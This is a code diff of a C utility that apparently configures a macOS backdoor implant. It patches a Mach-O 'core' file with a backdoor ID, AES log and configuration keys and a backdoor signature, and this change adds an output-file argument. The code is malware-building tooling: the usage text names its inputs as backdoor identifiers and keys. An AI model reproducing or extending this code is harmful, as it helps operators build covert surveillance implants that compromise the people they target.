@@ -26,6 +26,7 @@ CHAR szLogKey[64];
 CHAR szConfigurationKey[64];
 CHAR szBackdoorName[256];
 CHAR szFilename[MAX_PATH];
+CHAR szOutFilename[MAX_PATH];
 
 void
 unloadMachO (BYTE *fileBase)
@@ -33,10 +34,10 @@ unloadMachO (BYTE *fileBase)
   if (fileBase != NULL)
     UnmapViewOfFile ((LPCVOID)fileBase);
 
-  if(hMappedFile != INVALID_HANDLE_VALUE)
+  if (hMappedFile != INVALID_HANDLE_VALUE)
     CloseHandle (hMappedFile);
 
-  if(hMachoFile != INVALID_HANDLE_VALUE)
+  if (hMachoFile != INVALID_HANDLE_VALUE)
     CloseHandle (hMachoFile);
 }
 
@@ -66,6 +67,7 @@ loadMachO (char *fileName, unsigned int *len)
     {
       CloseHandle(hMachoFile);
       CloseHandle(hMappedFile);
+
       return NULL;
     }
 
@@ -114,9 +116,12 @@ patchMachoFile ()
 {
   int				iRet = false;
   BYTE			*pBlockPtr	= NULL;
+  BYTE			*pOutputPtr	= NULL;
   unsigned int	iLen = 0;
-
+  
+  // Loading mach-o file
   pBlockPtr = (BYTE *)loadMachO (szFilename, &iLen);
+
   BYTE md5Value[MD5_DIGEST_LENGTH];
 
   // Patching log aes key
@@ -192,15 +197,21 @@ patchMachoFile ()
     }
 
   printf("[x] Configuration filename patched\n");
-
+  
   unloadMachO (pBlockPtr);
+
+  if (CopyFile(szFilename, szOutFilename, FALSE) == 0)
+    {
+      printf("[ee] Error while generating the output file\n");
+    }
+
   return kSuccess;
 }
 
 int
 parseArguments (int argc, TCHAR **argv)
 {
-  if (argc != 6)
+  if (argc != 7)
     {
       return kArgError;
     }
@@ -210,7 +221,8 @@ parseArguments (int argc, TCHAR **argv)
   sprintf_s (szConfigurationKey, sizeof(szConfigurationKey), "%s", argv[3]);
   sprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), "%s", argv[4]);
   sprintf_s (szFilename, sizeof(szFilename), "%s", argv[5]);
-
+  sprintf_s (szOutFilename, sizeof(szOutFilename), "%s", argv[6]);
+  
   //
   //  Sanity checks
   //
@@ -245,11 +257,12 @@ void
 usage (TCHAR *aBinaryName)
 {
   printf ("\nUsage: %S <bid> <log_key> <conf_key> <bsignature> <core_file>\n\n", aBinaryName);
-  printf ("\t<bid>        : backdoor id\n");
-  printf ("\t<log_key>    : aes log key\n");
-  printf ("\t<conf_key>   : aes conf key\n");
-  printf ("\t<bsignature> : backdoor signature\n");
-  printf ("\t<core_file>  : core file name path\n\n");
+  printf ("\t<bid>          : backdoor id\n");
+  printf ("\t<log_key>      : aes log key\n");
+  printf ("\t<conf_key>     : aes conf key\n");
+  printf ("\t<bsignature>   : backdoor signature\n");
+  printf ("\t<core_file>    : core file name path\n");
+  printf ("\t<output_file>  : output file name path\n\n");
 }
 
 int main (int argc, TCHAR *argv[])
